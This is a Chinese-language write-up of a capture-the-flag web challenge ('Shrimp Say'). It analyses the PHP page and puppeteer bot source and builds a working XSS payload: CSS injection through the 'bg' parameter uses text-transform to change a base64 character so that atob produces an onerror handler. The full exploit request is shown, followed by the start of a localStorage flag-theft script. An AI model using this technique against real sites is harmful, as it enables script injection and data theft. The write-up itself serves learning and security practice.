## 侦察与探测

访问首页 `/`
- 响应
    ```http
    HTTP/1.1 302 Found
    Server: Apache/2.4.57 (Debian)
    X-Powered-By: PHP/8.3.0
    Location: /?msg=Hello Shrimp&bg=lightblue
    Content-Length: 0
    ```

- 追踪重定向 `/?msg=Hello%20Shrimp&bg=lightblu`
    ```html
    <img src="/shrimp.gif" alt="Shrimp">
    ```
    - 静态资源端点
    
    ```html
    <style>
        body {
            background-color: lightblue;
        }
    </style>

    <div class="speech-bubble"></div>

    <script type="text/base64" id="data">SGVsbG8gU2hyaW1w</script>
    <script>
        document.querySelector(".speech-bubble").innerHTML = atob(document.getElementById('data').innerText)
    </script>
    ```
    - base64 解码 `SGVsbG8gU2hyaW1w`
        `Hello Shrimp`

    - 请求参数 `msg=Hello Shrimp` 以 base64 编码形式反射到 JS 块中，并解码后设置 `innerHTML`
        - 源，输入参数 `msg=输入`
        - 汇1，`script id=data` 的代码块
        - 汇2，`div` 的 `innerText`
    
    - 请求参数 `bg=lightblu` 反射到 css 的 `background-color: lightblue;`
        - 源，输入参数 `bg=lightblu`
        - 汇，css `background-color: lightblue;`


分析
- `bg` 被 HTML 编码
    ```php
    <?= htmlentities($bg) ?>
    ```
    - 无法直接用来插入代码
- `msg` 参数查找 `<`
    ```php
    strpos($msg, "<") !== false
    ```
    - 缺乏开括号，被解析为普通文本

- 核心代码
    ```js
    document.querySelector(".speech-bubble").innerHTML = atob(document.getElementById('data').innerText)
    ```
    - `innerText` 提取 css 渲染文本段，在 base64 解码后设置为 HTML
    - bg 的 css 上下文中，`text-transform` 修改文本大小写
    - 修改大小写后，base64 解码时或可构造出 `<`

- 搜索[规范](https://html.spec.whatwg.org/multipage/rendering.html#non-replaced-elements)

    ```css
    area, base, basefont, datalist, head, link, meta, noembed,
    noframes, param, rp, script, style, template, title {
    display: none;
    }
    ```
    - script 默认显示为 `none`，不参与渲染。需修改显示 css 属性

分析 base64 编码
- 基准载荷
    ```
    <img/src/onerror=print()>
    ```
    ```
    PGltZy9zcmMvb25lcnJvcj1wcmludCgpPg==
    ```

- 预期使用 `text-transform: capitalize`，修改第一个字符为大写，而其余不变，修改
    1. 修改首字母为小写
        ```
        pGltZy9zcmMvb25lcnJvcj1wcmludCgpPg==
        ```
    2. base64 解码，并 URL 编码
        ```
        %a4%69%6d%67%2f%73%72%63%2f%6f%6e%65%72%72%6f%72%3d%70%72%69%6e%74%28%29%3e
        ```

- 设置 css 载荷
    ```css
    ;} #data { display:block; text-transform: capitalize
    ```
    - 闭合原文后选择 script 元素，并修改为块级渲染以及首字母大写

- 测试载荷
    ```http
    GET /?msg=%a4%69%6d%67%2f%73%72%63%2f%6f%6e%65%72%72%6f%72%3d%70%72%69%6e%74%28%29%3e&bg=<@urlencode> ;} #data { display:block; text-transform: capitalize</@urlencode> HTTP/1.1
    ```

    - 响应
        ```css
        body {
            background-color:  ;} #data { display:block; text-transform: capitalize;
        }
        ```
    
    - 查看浏览器，立即弹窗
        ```html
        <div class="speech-bubble"><img src="" onerror="print()"></div>
        ```
        - 载荷成功注入

窃取本地存储的 flag
- JS 载荷

    let flag_name = localStorage.key(0);

### src\shrimp-say\index.php

```php
<?php

# 重定向逻辑
function redirect($msg, $bg)
{
  header("Location: /?msg=$msg&bg=$bg");
  die();
}

# 参数中至少包含 `msg`
if (!isset($_GET['msg'])) {
  redirect("Hello Shrimp", "lightblue");
}

# 缺乏参数值则设置默认值
$msg = $_GET['msg'] ?? "Hello World";
$bg = $_GET['bg'] ?? "lightblue";


# `msg` 参数值中寻找 `<`
if (strpos($msg, "<") !== false) {
  redirect("NO XSS", "red");
}

?>
<!DOCTYPE html>
<html>

<head>
  <link rel="icon" href="data:,">
  <style>
    # 反射到 css
    body {
      background-color: <?= htmlentities($bg) ?>;
    }
    ...
  </style>
</head>

<body>
  <main>
    # 反射到 div innerHTML
    <div class="speech-bubble"></div>
    <img src="/shrimp.gif" alt="Shrimp">
  </main>
  <script type="text/base64" id="data"><?= base64_encode($msg) ?></script>
  <script>
    document.querySelector(".speech-bubble").innerHTML = atob(document.getElementById('data').innerText)
  </script>
</body>

</html>
```
- `bg` 被 HTML 编码，无法作为注入点

### src\shrimp-say-bot\src\bot.js

```js
// Force puppeteer to store everything to /tmp/
process.env.HOME = "/tmp";

const { delay, handleTargetCreated, handleTargetDestroyed, logMainInfo, logMainError } = require("./utils");
const puppeteer = require("puppeteer");

// Banner
const tips = ["Every console.log usage on the bot will be sent back to you :)"];
console.log(`==========\nTips: ${tips[Math.floor(Math.random() * tips.length)]}\n==========`);

// flag 读取到变量 FLAG
const CHALLENGE_HOST = process.env.CHALLENGE_HOST || "http://chall/";
const FLAG = process.env.FLAG || "FCSC{placeholder}";

// Spawn the bot and navigate to the user provided link
async function goto(url) {
  logMainInfo("Starting the browser...");
  const browser = await puppeteer.launch({
    headless: "new",
    ignoreHTTPSErrors: true,
    args: ["--no-sandbox", "--disable-gpu", "--disable-jit", "--disable-wasm", "--disable-dev-shm-usage"],
    executablePath: "/usr/bin/chromium-browser",
  });

  // Hook tabs events
  browser.on("targetcreated", handleTargetCreated.bind(browser));
  browser.on("targetdestroyed", handleTargetDestroyed.bind(browser));

  /* ** CHALLENGE LOGIC ** */
  const page = await browser.newPage();
  await page.setDefaultNavigationTimeout(5000);

  logMainInfo(`Setting the flag in the localStorage for ${CHALLENGE_HOST}...`);
  await page.goto(CHALLENGE_HOST, { timeout: 1000, waitUntil: "domcontentloaded" });

    // FLAG 保存的 flag 存储到 localStorage
  await page.evaluate((flag) => {
    localStorage.setItem("flag", flag);
  }, FLAG);



  logMainInfo(`Going to the user provided link...`);
  try {
    await page.goto(url);
  } catch (e) {
  }
  await delay(3000);

  logMainInfo("Leaving o/");
  await browser.close();
  return;
}

// Handle TCP data

logMainInfo("Please provide the URL you want to visit:");
process.stdin.on("data", (data) => {
  const url = data.toString().trim();

  if (!url || !(url.startsWith("http://") || url.startsWith("https://"))) {
    console.log("[ERROR] Invalid URL!");
    process.exit(1);
  }

  goto(url)
    .then(() => process.exit(0))
    .catch((error) => {
      if (process.env.ENVIRONMENT === "development") {
        console.error(error);
      }
      process.exit(1);
    });
});

```
- XSS 型挑战，窃取 `localStorage` 中的数据
